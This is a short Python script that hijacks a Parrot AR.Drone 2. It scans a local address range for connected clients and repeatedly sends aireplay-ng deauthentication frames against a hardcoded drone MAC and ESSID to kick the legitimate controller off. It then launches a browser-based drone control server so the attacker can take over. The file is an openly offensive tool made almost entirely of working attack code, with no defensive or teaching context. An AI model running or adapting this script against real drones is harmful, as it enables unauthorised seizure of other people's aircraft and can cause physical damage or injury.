#!/usr/bin/env python3
import os, time, sys
from ftplib import FTP
from scan_clients import *
from spoof import *
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def eject_client(client):
    mac_client = client.mac
    print(client.mac)
    mac_drone = "90:03:B7:C8:29:51"
    drone_essid = "ardrone2_022491"
    iface = "wlo1"
    channel = 6
    cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2}".format(mac_drone, mac_client, iface, drone_essid)
    for i in range(40):
        os.system("sudo iwconfig {0} channel {1}".format(iface, channel))
        os.system(cmd)

def launch_server():
    cmd = "cd drone-browser && node server.js &"
    cmd2 = "firefox localhost:3001"
    os.system(cmd)
    # os.system(cmd2)




def main():
    network = '192.168.1.1-10'
    client_list = scanNetwork(network)
    for client in client_list:
        print(client.ip)
        eject_client(client)
    launch_server()


#if __name__ == 'main':
main()
